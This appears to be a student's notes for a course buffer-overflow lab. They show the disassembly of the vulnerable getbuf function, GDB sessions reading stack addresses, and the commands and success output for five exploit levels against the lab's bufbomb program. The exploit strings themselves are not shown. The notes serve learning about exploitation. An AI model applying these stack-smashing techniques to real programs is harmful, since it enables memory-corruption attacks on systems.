# Buffer Lab

- Userid = mdzz
- Cookie = 0x761b76ec

Assemble and disassemble the injected file, usied in last two phases:
```sh
unix> gcc -m32 -c example.S
unix> objdump -d example.o > example.d
```

```Disassembly
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret
```

## Level 0: Candle (10 pts)

```sh
$ cat candle.txt|./hex2raw|./bufbomb -u mdzz
Userid: mdzz
Cookie: 0x761b76ec
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```

## Level 1: Sparkler (10 pts)

```sh
$ cat sparkler.txt|./hex2raw|./bufbomb -u mdzz
Userid: mdzz
Cookie: 0x761b76ec
Type string:Fizz!: You called fizz(0x761b76ec)
VALID
NICE JOB!
```

## Level 2: Firecracker (15 pts)

Use GDB to get the information needed to construct exploit string.

```sh
(gdb) run -u mdzz
Starting program: /home/zna2/Desktop/computer-systems/labs/Lab4-Buffer Lab/buflab-handout/bufbomb -u mdzz
Userid: mdzz
Cookie: 0x761b76ec

Breakpoint 1, 0x080491fa in getbuf ()
(gdb) disas
Dump of assembler code for function getbuf:
   0x080491f4 <+0>:	push   %ebp
   0x080491f5 <+1>:	mov    %esp,%ebp
   0x080491f7 <+3>:	sub    $0x38,%esp
=> 0x080491fa <+6>:	lea    -0x28(%ebp),%eax
   0x080491fd <+9>:	mov    %eax,(%esp)
   0x08049200 <+12>:	call   0x8048cfa <Gets>
   0x08049205 <+17>:	mov    $0x1,%eax
   0x0804920a <+22>:	leave  
   0x0804920b <+23>:	ret    
End of assembler dump.
(gdb) print /x $esp
$1 = 0x55683098
(gdb) print /x $ebp
$2 = 0x556830d0
```

```sh
$ cat Firecracker.txt |./hex2raw| ./bufbomb -u mdzz
Userid: mdzz
Cookie: 0x761b76ec
Type string:Bang!: You set global_value to 0x761b76ec
VALID
NICE JOB!

```

## Level 3: Dynamite (20 pts)

```
(gdb) break getbuf
Breakpoint 1 at 0x80491fa
(gdb) run -u mdzz
Starting program: /home/zna2/Desktop/computer-systems/labs/Lab4-Buffer Lab/buflab-handout/bufbomb -u mdzz
Userid: mdzz
Cookie: 0x761b76ec

Breakpoint 1, 0x080491fa in getbuf ()
Missing separate debuginfos, use: debuginfo-install glibc-2.17-222.el7.i686
(gdb) x /x $ebp
0x556830d0 <_reserved+1036496>:	0x55683100
```

```sh
$ cat Dynamite.txt|./hex2raw|./bufbomb -u mdzz
Userid: mdzz
Cookie: 0x761b76ec
Type string:Boom!: getbuf returned 0x761b76ec
VALID
NICE JOB!

```

## Level 4: Nitroglycerin (10 pts)

```sh
$ cat Nitroglycerin.txt|./hex2raw -n|./bufbomb -u mdzz -n
Userid: mdzz
Cookie: 0x761b76ec
Type string:KABOOM!: getbufn returned 0x761b76ec
Keep going
Type string:KABOOM!: getbufn returned 0x761b76ec
Keep going
Type string:KABOOM!: getbufn returned 0x761b76ec
Keep going
Type string:KABOOM!: getbufn returned 0x761b76ec
Keep going
Type string:KABOOM!: getbufn returned 0x761b76ec
VALID
NICE JOB!
```
